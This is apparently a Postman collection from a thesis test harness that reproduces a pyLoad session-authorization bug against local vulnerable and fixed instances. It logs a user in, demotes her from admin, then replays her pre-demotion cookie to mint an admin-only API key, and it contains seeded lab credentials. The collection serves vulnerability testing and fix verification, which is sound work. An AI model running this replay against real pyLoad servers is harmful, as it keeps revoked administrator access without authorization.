{
  "info": {
    "name": "Tier-2b pyLoad CVE-2026-41133 (A1 stateful-authz)",
    "description": "Third-party target. VULNERABLE on :8090 (default baseUrl), FIXED on :8091. Accounts seeded by seed_users.py: alice/alicepass (ADMIN victim), superadmin/superpass (ADMIN operator), pyload/pyload (pyLoad's own ADMIN). Auth is a SESSION COOKIE (pyload_session_8000), not a bearer token: POST /login form {username,password} returns Set-Cookie. The /json/* surface denies with 403; the /api/* surface denies with 401 (INCONCLUSIVE).\n\nCOOKIE REPLAY NOTE: the A1 bug is that alice's PRE-transition cookie keeps working after she is demoted. Postman's shared cookie jar would overwrite alice's cookie when superadmin logs in, hiding the bug. So the 'A1 bug demo' folder captures each login's Set-Cookie into a variable and sends it back as an explicit Cookie header. For a faithful replay, clear the Postman cookie jar for localhost (or turn the jar off) so only the explicit header is sent. On VULNERABLE the last call returns 200 (bug); on FIXED it returns 403.",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "variable": [
    { "key": "baseUrl", "value": "http://localhost:8090" },
    { "key": "aliceCookie", "value": "" },
    { "key": "superCookie", "value": "" }
  ],
  "item": [
    {
      "name": "Setup",
      "item": [
        {
          "name": "POST /thesis/reset (reseed, injected)",
          "request": {
            "method": "POST",
            "header": [],
            "url": { "raw": "{{baseUrl}}/thesis/reset", "host": ["{{baseUrl}}"], "path": ["thesis", "reset"] },
            "description": "Unauthenticated reset endpoint injected for the thesis (deviation 4). Restores account roles. GET also works."
          }
        },
        {
          "name": "POST /login (alice, capture cookie)",
          "event": [
            {
              "listen": "test",
              "script": {
                "type": "text/javascript",
                "exec": [
                  "var sc = pm.response.headers.get('Set-Cookie');",
                  "if (sc) { var m = sc.match(/pyload_session_8000=[^;]+/); if (m) { pm.collectionVariables.set('aliceCookie', m[0]); } }"
                ]
              }
            }
          ],
          "request": {
            "method": "POST",
            "header": [ { "key": "Content-Type", "value": "application/x-www-form-urlencoded" } ],
            "body": {
              "mode": "urlencoded",
              "urlencoded": [
                { "key": "username", "value": "alice" },
                { "key": "password", "value": "alicepass" }
              ]
            },
            "url": { "raw": "{{baseUrl}}/login", "host": ["{{baseUrl}}"], "path": ["login"] },
            "description": "Stores alice's session cookie into {{aliceCookie}}."
          }
        },
        {
          "name": "POST /login (superadmin, capture cookie)",
          "event": [
            {
              "listen": "test",
              "script": {
                "type": "text/javascript",
                "exec": [
                  "var sc = pm.response.headers.get('Set-Cookie');",
                  "if (sc) { var m = sc.match(/pyload_session_8000=[^;]+/); if (m) { pm.collectionVariables.set('superCookie', m[0]); } }"
                ]
              }
            }
          ],
          "request": {
            "method": "POST",
            "header": [ { "key": "Content-Type", "value": "application/x-www-form-urlencoded" } ],
            "body": {
              "mode": "urlencoded",
              "urlencoded": [
                { "key": "username", "value": "superadmin" },
                { "key": "password", "value": "superpass" }
              ]
            },
            "url": { "raw": "{{baseUrl}}/login", "host": ["{{baseUrl}}"], "path": ["login"] }
          }
        }
      ]
    },
    {
      "name": "Endpoints",
      "item": [
        {
          "name": "POST /json/generate_apikey (source guard, admin-only)",
          "request": {
            "method": "POST",
            "header": [ { "key": "Content-Type", "value": "application/json" }, { "key": "Cookie", "value": "{{aliceCookie}}" } ],
            "body": { "mode": "raw", "raw": "{\"user\":\"alice\",\"password\":\"alicepass\",\"name\":\"before\",\"expires\":null}" },
            "url": { "raw": "{{baseUrl}}/json/generate_apikey", "host": ["{{baseUrl}}"], "path": ["json", "generate_apikey"] },
            "description": "Admin-only, non-consuming write (mints a new key each call, so repeatable). Denied -> 403. Uses alice's cookie."
          }
        },
        {
          "name": "POST /json/update_users (transition, operator)",
          "request": {
            "method": "POST",
            "header": [ { "key": "Content-Type", "value": "application/json" }, { "key": "Cookie", "value": "{{superCookie}}" } ],
            "body": { "mode": "raw", "raw": "{\"update_data\": {\"superadmin|admin\": true, \"pyload|admin\": true}}" },
            "url": { "raw": "{{baseUrl}}/json/update_users", "host": ["{{baseUrl}}"], "path": ["json", "update_users"] },
            "description": "Bulk desired-state write. Marks every OTHER admin as admin; any admin not listed (here alice) is reduced to role USER. Uses superadmin's cookie."
          }
        },
        {
          "name": "POST /api/set_user_permission (inferred transition)",
          "request": {
            "method": "POST",
            "header": [ { "key": "Content-Type", "value": "application/json" }, { "key": "Cookie", "value": "{{superCookie}}" } ],
            "body": { "mode": "raw", "raw": "{\"user\":\"alice\",\"role\":1,\"permission\":0}" },
            "url": { "raw": "{{baseUrl}}/api/set_user_permission", "host": ["{{baseUrl}}"], "path": ["api", "set_user_permission"] },
            "description": "pyLoad's named-parameter role endpoint (the one the tool infers). role=1 demotes ADMIN->USER; permission=0 clears the whole Perms bitmask. Note /api/* denies with 401, not 403."
          }
        }
      ]
    },
    {
      "name": "A1 bug demo (970 triple)",
      "description": "Run top to bottom. Clear the Postman cookie jar for localhost first so only the explicit Cookie headers are sent. VULNERABLE (:8090): step 5 returns 200. FIXED (:8091): step 5 returns 403.",
      "item": [
        {
          "name": "1. POST /thesis/reset",
          "request": {
            "method": "POST",
            "header": [],
            "url": { "raw": "{{baseUrl}}/thesis/reset", "host": ["{{baseUrl}}"], "path": ["thesis", "reset"] }
          }
        },
        {
          "name": "2. login alice (capture pre-transition cookie)",
          "event": [
            {
              "listen": "test",
              "script": {
                "type": "text/javascript",
                "exec": [
                  "var sc = pm.response.headers.get('Set-Cookie');",
                  "if (sc) { var m = sc.match(/pyload_session_8000=[^;]+/); if (m) { pm.collectionVariables.set('aliceCookie', m[0]); } }"
                ]
              }
            }
          ],
          "request": {
            "method": "POST",
            "header": [ { "key": "Content-Type", "value": "application/x-www-form-urlencoded" } ],
            "body": {
              "mode": "urlencoded",
              "urlencoded": [
                { "key": "username", "value": "alice" },
                { "key": "password", "value": "alicepass" }
              ]
            },
            "url": { "raw": "{{baseUrl}}/login", "host": ["{{baseUrl}}"], "path": ["login"] }
          }
        },
        {
          "name": "3. source: generate_apikey with alice cookie (expect 200)",
          "event": [
            {
              "listen": "test",
              "script": {
                "type": "text/javascript",
                "exec": [ "pm.test('source ALLOWED 200', function () { pm.response.to.have.status(200); });" ]
              }
            }
          ],
          "request": {
            "method": "POST",
            "header": [ { "key": "Content-Type", "value": "application/json" }, { "key": "Cookie", "value": "{{aliceCookie}}" } ],
            "body": { "mode": "raw", "raw": "{\"user\":\"alice\",\"password\":\"alicepass\",\"name\":\"before\",\"expires\":null}" },
            "url": { "raw": "{{baseUrl}}/json/generate_apikey", "host": ["{{baseUrl}}"], "path": ["json", "generate_apikey"] }
          }
        },
        {
          "name": "4. transition: login superadmin + update_users (demote alice)",
          "event": [
            {
              "listen": "prerequest",
              "script": {
                "type": "text/javascript",
                "exec": [
                  "var r = { url: pm.variables.replaceIn('{{baseUrl}}/login'), method: 'POST',",
                  "  header: { 'Content-Type': 'application/x-www-form-urlencoded' },",
                  "  body: { mode: 'urlencoded', urlencoded: [ {key:'username',value:'superadmin'}, {key:'password',value:'superpass'} ] } };",
                  "pm.sendRequest(r, function (err, res) {",
                  "  if (!err && res) { var sc = res.headers.get('Set-Cookie');",
                  "    if (sc) { var m = sc.match(/pyload_session_8000=[^;]+/); if (m) { pm.collectionVariables.set('superCookie', m[0]); } } }",
                  "});"
                ]
              }
            },
            {
              "listen": "test",
              "script": {
                "type": "text/javascript",
                "exec": [ "pm.test('transition 200', function () { pm.response.to.have.status(200); });" ]
              }
            }
          ],
          "request": {
            "method": "POST",
            "header": [ { "key": "Content-Type", "value": "application/json" }, { "key": "Cookie", "value": "{{superCookie}}" } ],
            "body": { "mode": "raw", "raw": "{\"update_data\": {\"superadmin|admin\": true, \"pyload|admin\": true}}" },
            "url": { "raw": "{{baseUrl}}/json/update_users", "host": ["{{baseUrl}}"], "path": ["json", "update_users"] },
            "description": "Pre-request logs superadmin in and captures the operator cookie; the main call demotes alice (she is absent from the admin list)."
          }
        },
        {
          "name": "5. follow-up: generate_apikey with STALE alice cookie (vuln 200 / fixed 403)",
          "event": [
            {
              "listen": "test",
              "script": {
                "type": "text/javascript",
                "exec": [
                  "pm.test('follow-up status', function () {",
                  "  pm.expect([200, 403]).to.include(pm.response.code);",
                  "});",
                  "console.log('follow-up code = ' + pm.response.code + ' (200 = BUG A1, 403 = fixed)');"
                ]
              }
            }
          ],
          "request": {
            "method": "POST",
            "header": [ { "key": "Content-Type", "value": "application/json" }, { "key": "Cookie", "value": "{{aliceCookie}}" } ],
            "body": { "mode": "raw", "raw": "{\"user\":\"alice\",\"password\":\"alicepass\",\"name\":\"after\",\"expires\":null}" },
            "url": { "raw": "{{baseUrl}}/json/generate_apikey", "host": ["{{baseUrl}}"], "path": ["json", "generate_apikey"] },
            "description": "Replays alice's pre-transition cookie, no re-login. On VULNERABLE still 200; on FIXED 403."
          }
        }
      ]
    }
  ]
}
